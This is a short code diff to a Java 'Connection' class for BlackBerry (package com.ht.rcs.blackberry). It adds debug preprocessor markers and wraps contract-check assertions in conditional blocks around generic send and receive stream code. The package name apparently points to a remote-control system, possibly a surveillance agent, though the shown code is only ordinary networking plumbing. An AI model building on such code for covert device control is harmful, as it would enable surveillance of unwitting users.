@@ -19,7 +19,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class Connection {
     protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);
-    
+
     protected DataInputStream in;
     protected DataOutputStream out;
     protected StreamConnection connection = null;
@@ -35,6 +35,7 @@ public abstract class Connection {
                 try {
                     in.close();
                 } catch (IOException e) {
+                    // #debug
                     debug.error(e.toString());
                 }
             }
@@ -43,6 +44,7 @@ public abstract class Connection {
                 try {
                     out.close();
                 } catch (IOException e) {
+                    // #debug
                     debug.error(e.toString());
                 }
             }
@@ -51,6 +53,7 @@ public abstract class Connection {
                 try {
                     connection.close();
                 } catch (IOException e) {
+                    // #debug
                     debug.error(e.toString());
                 }
             }
@@ -68,14 +71,14 @@ public abstract class Connection {
 
     public synchronized byte[] receive(int length) throws IOException {
         if (connected) {
-            Check.requires(in != null, "null in_");
+            // #ifdef DBC
+//@            Check.requires(in != null, "null in_");
+            // #endif
 
             // Create an input array just big enough to hold the data
             // (we're expecting the same string back that we send).
             byte[] buffer = new byte[length];
             in.readFully(buffer);
-
-            // Check.ensures(read == buffer.length, "Wrong read len: "+read);
 
             // Hand the data to the parent class for updating the GUI. By
             // explicitly
@@ -96,11 +99,14 @@ public abstract class Connection {
     public synchronized boolean send(byte[] data) throws IOException {
 
         if (connected) {
-            Check.requires(out != null, "null out_");
+            // #ifdef DBC
+//@            Check.requires(out != null, "null out_");
+            // #endif
 
             int length = data.length;
             out.write(data, 0, length);
 
+            // #debug
             debug.trace("sent :" + length);
             return true;
         } else {
